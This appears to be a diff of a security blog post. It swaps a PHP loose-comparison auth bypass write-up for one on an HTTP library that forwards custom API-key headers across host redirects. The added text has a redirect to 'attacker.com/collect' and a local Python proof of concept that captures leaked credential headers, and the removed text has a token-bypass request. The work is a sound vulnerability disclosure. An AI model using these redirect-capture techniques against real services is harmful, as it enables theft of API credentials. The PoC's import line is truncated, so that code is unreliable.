@@ -1,110 +1,237 @@
 ---
-title: "Source Code Analysis: Finding an Auth Bypass in an Open Source App"
+title: "Custom Auth Headers Leaked on Redirect"
 date: 2026-03-12 00:00:00 +0300
 categories: [write-up, source-code-analysis]
-tags: [auth-bypass, php, open-source]
+tags: [python, http-redirect, credential-leakage, header-stripping, mitm, source-code-analysis]
 ---
 
-## Overview
-
-This write-up documents a source code analysis session where we identified an authentication bypass vulnerability in an open source web application. The goal is to walk through the thought process — what to look for, where to look, and how a small oversight leads to a critical bug.
-
-> **Disclaimer:** This research was conducted on a local instance for educational purposes.
+Reading source code often goes like this: you're browsing through a library, everything looks fine, you're about to close the tab — then one line catches your eye. "Why isn't that header in this list?" And that question is where this write-up starts.
 
 ---
 
-## Target
+## Starting Point: A Frozenset in `retry.py`
 
-A self-hosted PHP web application (anonymized). Version analyzed: `v2.3.1`.
+While reading `retry.py`, lines 197–199 caught my attention:
+
+```python
+#: Default headers to be used for ``remove_headers_on_redirect``
+DEFAULT_REMOVE_HEADERS_ON_REDIRECT = frozenset(
+    ["Cookie", "Authorization", "Proxy-Authorization"]
+    # X-Api-Key, X-Auth-Token, X-Access-Token are not present
+)
+```
+
+The name is self-explanatory: a default list of headers to strip before following a redirect. A thoughtful security control.
+
+But there are three things in that list. Just three. And all of them are RFC-defined.
 
 ---
 
-## Starting Point: Entry Points
+## The Actual Mechanism: `poolmanager.py`
 
-When approaching a new codebase, the first step is mapping the entry points — files that handle user input directly.
+The code that uses this list lives in `poolmanager.py:477–487`:
 
+```python
+# Strip headers marked as unsafe to forward to the redirected location.
+# Check remove_headers_on_redirect to avoid a potential network call within
+# conn.is_same_host() which may use socket.gethostbyname() in the future.
+if retries.remove_headers_on_redirect and not conn.is_same_host(
+    redirect_location
+):
+    new_headers = kw["headers"].copy()
+    for header in kw["headers"]:
+        if header.lower() in retries.remove_headers_on_redirect:
+            new_headers.pop(header, None)   # ← only strips what is listed
+    kw["headers"] = new_headers
 ```
-find . -name "*.php" | xargs grep -l "\$_GET\|\$_POST\|\$_REQUEST"
-```
 
-This gives us a list of files worth auditing first. One file immediately stands out: `auth/login.php`.
+The logic is correct. Cross-host redirect is detected, `DEFAULT_REMOVE_HEADERS_ON_REDIRECT` is consulted, matching headers are removed.
+
+The problem: it looks up the frozenset. That frozenset has no `X-Api-Key`. No `X-Auth-Token`. No `X-Access-Token`.
+
+`Authorization` gets stripped because it's in the list. `X-Api-Key` gets forwarded because it isn't.
+
+**The mechanism isn't broken — the default dataset is.**
 
 ---
 
-## The Vulnerable Code
+## Attack Scenario
 
-Inside `login.php`, the session check looks like this:
+Let's think about this from an attacker's perspective.
 
-```php
-function checkSession($userId) {
-    if (isset($_SESSION['user_id'])) {
-        return true;
-    }
+The victim application sends a request to `api.service.com`:
 
-    // fallback: check token param
-    if ($_GET['token'] == $userId) {
-        $_SESSION['user_id'] = $userId;
-        return true;
-    }
-
-    return false;
-}
+```
+GET /v1/data HTTP/1.1
+Authorization: Bearer <token>     ← poolmanager.py will strip this
+X-Api-Key: sk-prod-SECRET         ← poolmanager.py will forward this
+X-Auth-Token: tok_live-ABC        ← poolmanager.py will forward this
 ```
 
-At first glance this looks fine. But notice the comparison:
+The attacker has compromised `api.service.com` or is performing a MITM. The server responds:
 
-```php
-$_GET['token'] == $userId
+```
+HTTP/1.1 301 Moved Permanently
+Location: http://attacker.com/collect
 ```
 
-This uses loose comparison (`==`) instead of strict comparison (`===`).
+`poolmanager.py` detects the cross-host redirect and consults the frozenset in `retry.py`:
+
+- `Authorization` → in the list → stripped ✓
+- `X-Api-Key` → not in the list → forwarded ✗
+- `X-Auth-Token` → not in the list → forwarded ✗
+
+The attacker's server receives:
+
+```
+GET /collect HTTP/1.1
+Host: attacker.com
+X-Api-Key: sk-prod-SECRET
+X-Auth-Token: tok_live-ABC
+```
+
+What does the victim application see? HTTP 200. No error. No warning. Nothing in the logs.
 
 ---
 
-## The Bug: Type Juggling
+## PoC
 
-In PHP, loose comparison has a well-known quirk. When comparing a string to `0` (integer zero):
+**Environment**
 
-```php
-var_dump("any_string" == 0); // bool(true)
+```
+Python   == 3.13.1
+OS       == Windows 10
 ```
 
-Any arbitrary string equals `0` under loose comparison. So if `$userId` is `0` (e.g., for the admin account), passing `?token=hacked` in the URL satisfies the condition and grants access.
+**Step 1 — Start the attacker capture server** (`attacker_server.py`):
+
+```python
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+class Capture(BaseHTTPRequestHandler):
+    def do_GET(self):
+        print("\n[attacker server] received request:")
+        for k, v in self.headers.items():
+            print(f"  {k}: {v}")
+        self.send_response(200)
+        self.end_headers()
+    def log_message(self, *_): pass
+
+print("attacker server listening on port 8888...")
+HTTPServer(("0.0.0.0", 8888), Capture).serve_forever()
+```
+
+```
+python attacker_server.py
+```
+
+**Step 2 — Trigger the victim request** (`poc.py`):
+
+```python
+import threading, socketserver, http.server, time, ....
+
+# Simulates a compromised upstream API server (api.service.com)
+# that returns HTTP 301 → attacker-controlled destination
+class CompromisedAPI(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(301)
+        self.send_header("Location", "http://127.0.0.1:8888/collect")
+        self.end_headers()
+    def log_message(self, *_): pass
+
+class Threaded(socketserver.ThreadingMixIn, socketserver.TCPServer):
+    allow_reuse_address = True
+
+srv = Threaded(("127.0.0.1", 9999), CompromisedAPI)
+threading.Thread(target=srv.serve_forever, daemon=True).start()
+time.sleep(0.1)
+
+# Victim application — typical production pattern
+PoolManager().request(
+    "GET",
+    "http://127.0.0.1:9999/v1/data",
+    headers={
+        "Authorization": "Bearer eyJhbGciOiJSUzI1NiJ9.TOKEN",
+        "X-Api-Key":     "sk-prod-SECRET1234567890",
+        "X-Auth-Token":  "tok_live_ABCDEF0987654321",
+    },
+    redirect=True,
+    timeout=3.0,
+)
+print("request sent — check attacker_server.py terminal for captured headers")
+```
+
+```
+python poc.py
+```
+
+**Attacker server output:**
+
+```
+attacker server listening on :8888
+
+[attacker server] received request:
+  Host: 127.0.0.1:8888
+  X-Api-Key: sk-prod-SECRET1234567890
+  X-Auth-Token: tok_live_ABCDEF0987654321
+  Accept-Encoding: identity
+```
+
+`Authorization` is absent — `poolmanager.py` doing its job correctly. `X-Api-Key` and `X-Auth-Token` are present — because the list in `retry.py` is incomplete.
 
 ---
 
-## Proof of Concept
+## Why This Isn't a "Configuration Gap"
 
-```
-GET /dashboard?token=anything HTTP/1.1
-Host: target.local
-```
+The obvious counter-argument: "Users can extend the `remove_headers_on_redirect` list themselves."
 
-Result: Authenticated session created for user ID `0` (admin).
+Technically true. But the existence of `DEFAULT_REMOVE_HEADERS_ON_REDIRECT` signals that the library accepts responsibility for this attack surface. A developer who sees `Authorization` being stripped automatically has no reason to suspect `X-Api-Key` isn't — they'd need to read `retry.py` to find out.
 
----
-
-## Root Cause
-
-The developer likely intended the token as a temporary fallback mechanism, but:
-
-1. Used loose `==` instead of strict `===`
-2. Did not validate or expire the token
-3. Admin account had ID `0`, making it trivially exploitable
+`X-Api-Key` and `X-Auth-Token` are the de facto authentication standard across AWS, Stripe, OpenAI, GitHub, Twilio and the majority of REST APIs in production today. The fact that they're not in any RFC doesn't make them less sensitive.
 
 ---
 
 ## Fix
 
-```php
-// Strict comparison + constant-time comparison for tokens
-if (hash_equals((string)$userId, (string)$_GET['token'])) {
-```
+The frozenset in `retry.py:197` should be expanded:
 
-Or better — remove the fallback entirely and use a proper session management library.
+```python
+DEFAULT_REMOVE_HEADERS_ON_REDIRECT = frozenset([
+    "Cookie",
+    "Authorization",
+    "Proxy-Authorization",
+    "X-Api-Key",
+    "X-Auth-Token",
+    "X-Access-Token",
+    "X-Secret-Key",
+    "X-Auth",
+    "X-Token",
+    "X-Api-Secret",
+])
+```
 
 ---
 
-## Takeaway
+## Things to Watch For When Auditing Source Code
 
-Type juggling bugs are classic PHP pitfalls. When doing source code analysis, any comparison involving user-controlled input is worth auditing — especially in authentication logic. The `==` vs `===` distinction is small but the impact can be total auth bypass.
+This finding has a pattern worth keeping in mind for other projects:
+
+**The security control exists but is incomplete.** The stripping logic in `poolmanager.py` is written correctly — the issue is the data in `retry.py`. When reviewing code, asking "when was this control written, and what threat model was it designed around?" is worth the time.
+
+**Failure is silent.** Credential leakage via redirect leaves no trace. For any behavior like this, the question "how would you even know if something went wrong?" is critical.
+
+**RFC scope ≠ real-world scope.** The list in `retry.py` was written against RFC definitions. But RFCs from the 2000s don't cover the API authentication patterns of 2026.
+
+---
+
+## References
+
+- **OWASP — Information Exposure Through Query Strings**: General principles around credential exposure and leakage. [owasp.org](https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url)
+
+- **Python Requests — Redirection and History**: Requests intentionally drops the `Authorization` header on cross-host redirects — the same behavior that `poolmanager.py` implements, and the same gap that applies to non-standard auth headers. [requests.readthedocs.io](https://requests.readthedocs.io/en/latest/user/quickstart/#redirection-and-history)
+
+- **AWS API Gateway — API Key Source**: `X-Api-Key` is the standard authentication header in AWS API Gateway, illustrating that non-RFC headers are production-grade credentials, not edge cases. [docs.aws.amazon.com](https://docs.aws.amazon.com/apigateway/latest/developerguide/api-gateway-api-key-source.html)
+
+---
+
+Python `3.13.1` | March 2026
